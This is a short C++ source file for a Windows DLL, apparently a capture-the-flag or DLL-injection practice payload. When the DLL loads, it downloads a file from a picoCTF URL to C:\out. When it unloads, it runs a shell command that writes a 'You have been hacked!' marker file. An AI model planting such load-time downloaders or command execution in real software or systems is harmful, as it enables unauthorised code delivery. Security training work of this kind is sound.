#include <windows.h>
#include <iostream>
#include <urlmon.h>  // Cần thiết để dùng URLDownloadToFileW
#pragma comment(lib, "urlmon.lib")  // Liên kết thư viện URLMON
#pragma comment(lib, "user32.lib")  // Liên kết thư viện user32

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		MessageBoxW(NULL, L"Hello from DLL!", L"DLL Message", MB_OK);
		URLDownloadToFileW(NULL, L"https://artifacts.picoctf.net/c_titan/103/out", L"C:\\out", 0, NULL);
		break;

	case DLL_PROCESS_DETACH:
		MessageBoxW(NULL, L"Goodbye from DLL!", L"DLL Message", MB_OK);
		_wsystem(L"cmd /c echo You have been hacked! > C:\\hacked.txt");
		break;
	}
	return TRUE;
}
